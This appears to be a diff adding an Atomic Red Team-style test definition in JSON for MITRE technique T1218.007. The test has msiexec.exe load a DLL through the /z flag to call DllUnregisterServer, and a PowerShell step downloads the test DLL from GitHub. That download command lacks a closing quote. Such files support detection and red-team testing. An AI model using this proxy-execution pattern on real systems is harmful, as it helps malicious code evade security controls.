@@ -1,0 +1,41 @@
+{
+    "name": "Msiexec.exe - Execute the DllUnregisterServer function of a DLL",
+    "description": "Loads a DLL into msiexec.exe and calls its DllUnregisterServer function. Note: the DLL included in the bin folder is only built for 64-bit, so this won't work on a 32-bit OS. ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "command": "#{msi_exe} /z \"#{dll_payload}\"\n",
+        "name": "command_prompt",
+        "type": "Command Executor"
+    },
+    "id": "T1218.007",
+    "tactics": [
+        "Defense Evasion"
+    ],
+    "technique": "Msiexec",
+    "source": "ART",
+    "uuid": "ab09ec85-4955-4f9c-b8e0-6851baf4d47f",
+    "arguments": {
+        "dll_payload": {
+            "description": "DLL to execute that has an implemented DllUnregisterServer function",
+            "type": "path",
+            "default": "PathToAtomicsFolder\\T1218.007\\bin\\MSIRunner.dll"
+        },
+        "msi_exe": {
+            "description": "MSIExec File Path",
+            "type": "path",
+            "default": "c:\\windows\\system32\\msiexec.exe"
+        }
+    },
+    "preconditions": [
+        {
+            "description": "The DLL must exist on disk at specified location (#{dll_payload})\n",
+            "prereq_command": "if (Test-Path \"#{dll_payload}\") {exit 0} else {exit 1}\n",
+            "get_prereq_command": "New-Item -Type Directory (split-path \"#{dll_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/MSIRunner.dll -OutFile \"#{dll_payload}\"\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
